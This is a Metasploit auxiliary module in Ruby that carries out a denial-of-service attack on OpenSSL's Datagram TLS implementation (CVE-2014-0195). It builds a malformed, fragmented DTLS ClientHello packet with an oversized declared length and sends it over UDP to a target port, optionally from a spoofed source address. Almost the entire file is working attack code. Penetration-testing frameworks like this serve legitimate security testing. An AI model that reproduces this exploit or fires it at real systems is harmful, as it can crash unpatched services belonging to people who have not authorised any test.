##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'securerandom'

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Dos
#  include Msf::Exploit::Capture
  include Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'OpenSSL DTLS Fragment Buffer Overflow DoS',
      'Description'	=> %q{
          This module performs a Denial of Service Attack against Datagram TLS in
          OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h.
          This occurs when a DTLS ClientHello message has multiple fragments and the
          fragment lengths of later fragments are larger than that of the first, a
          buffer overflow occurs, causing a DoS.
      },
      'Author'	=> [
            'Jon Hart <jon_hart[at]rapid7.com>', #original code
            ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2014-0195' ],
        ],
      'DisclosureDate' => 'Jun 05 2014'))

    register_options([
      Opt::RPORT(4433),
      OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
    ], self.class)

    deregister_options('FILTER','PCAPFILE', 'INTERFACE', 'SNAPLEN', 'TIMEOUT')
  end

  def run
    # build first hello fragment
    hello =  "\x01" # client hello
    hello << "\x00\x00\x02" # some small length
    hello << "\x00" * 5 # sequence + offset
    hello << "\x00\x00\x01" # some small fragment length
    # add second hello fragment
    hello << "\x01" # client hello
    hello << "\x00\xf3\xdb" # some large length
    hello << "\x00" * 5 # sequence + offset
    hello << "\x00\x00\x00" # some small fragment length
    hello << SecureRandom.random_bytes(10) # some random data
    # build header
    header = ""
    header << "\x16" # handshake
    header << [0xfeff].pack("n")
    header << "\x00" * 8 # epoch + sequence number
    header << [hello.length].pack("n")
    connect_udp
    print_status("Sending fragmented DTLS client hello packet to #{rhost}:#{rport}")
    # send the header and hello
    udp_sock.put(header + hello)

    disconnect_udp
  end
end
